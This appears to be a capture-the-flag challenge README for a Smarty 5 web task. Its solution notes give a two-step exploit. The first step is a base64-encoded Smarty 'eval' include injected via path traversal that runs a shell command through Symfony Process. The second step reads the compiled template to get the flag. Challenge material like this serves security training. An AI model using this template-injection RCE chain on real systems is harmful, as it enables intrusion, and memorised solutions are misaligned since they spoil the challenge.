# untitled-smarty-challenge
**Category:** Web
**Difficulty:** Medium
**Author:** downgrade

## Description

We're using Smarty 5, with open\_basedir, AND we don't pass user input directly into a template, *surely* this is secure. Oh wait...

## Distribution

handout dir

## deployment notes

!! rce challenge, must be instanced by klodd pls!!

## solution notes

`GET /?page={include+file="eval:base64:e1N5bWZvbnlcQ29tcG9uZW50XFByb2Nlc3NcUHJvY2Vzczo6ZnJvbVNoZWxsQ29tbWFuZGxpbmUoImNhdCAvZmxhZyogPj4gaW5kZXgucGhwIiktPnJ1bigpfQ=="}/../home`
`GET /?page=../templates_c/f5fb5be85efe77d883dab7b400f78b1997e42bc1_0.file_home.php`
